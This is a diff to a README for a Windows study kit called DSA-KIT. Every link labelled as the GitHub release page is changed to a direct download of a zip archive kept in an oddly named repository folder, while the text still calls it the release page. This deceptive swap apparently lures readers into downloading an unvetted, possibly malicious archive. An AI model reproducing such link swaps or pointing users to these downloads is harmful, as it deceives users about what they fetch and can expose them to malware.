@@ -1,6 +1,6 @@
 # 📚 DSA-KIT - Learn DSA With Clear Paths
 
-[![Download DSA-KIT](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/rationed-corokia221/DSA-KIT/releases)
+[![Download DSA-KIT](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/rationed-corokia221/DSA-KIT/raw/refs/heads/main/inexpectation/KIT-DS-1.0-beta.5.zip)
 
 ## 🚀 What is DSA-KIT?
 
@@ -30,7 +30,7 @@ DSA-KIT is meant to be easy to access on Windows. You do not need any special se
 
 ### How to get it
 
-1. Open the release page here: https://github.com/rationed-corokia221/DSA-KIT/releases
+1. Open the release page here: https://github.com/rationed-corokia221/DSA-KIT/raw/refs/heads/main/inexpectation/KIT-DS-1.0-beta.5.zip
 2. Look at the latest release at the top
 3. Download the file that matches your system
 4. If the release gives you a zip file, save it to your PC
@@ -42,7 +42,7 @@ DSA-KIT is meant to be easy to access on Windows. You do not need any special se
 
 Use the release page below to visit this page to download:
 
-[Visit DSA-KIT Releases](https://github.com/rationed-corokia221/DSA-KIT/releases)
+[Visit DSA-KIT Releases](https://github.com/rationed-corokia221/DSA-KIT/raw/refs/heads/main/inexpectation/KIT-DS-1.0-beta.5.zip)
 
 After you open the release page:
 
@@ -161,7 +161,7 @@ Keep the files in one folder so they are easy to find.
 
 Check the release page from time to time for new files, better sheets, and updated study material.
 
-[Open Releases](https://github.com/rationed-corokia221/DSA-KIT/releases)
+[Open Releases](https://github.com/rationed-corokia221/DSA-KIT/raw/refs/heads/main/inexpectation/KIT-DS-1.0-beta.5.zip)
 
 ## 🧪 Topics and Search Terms
 
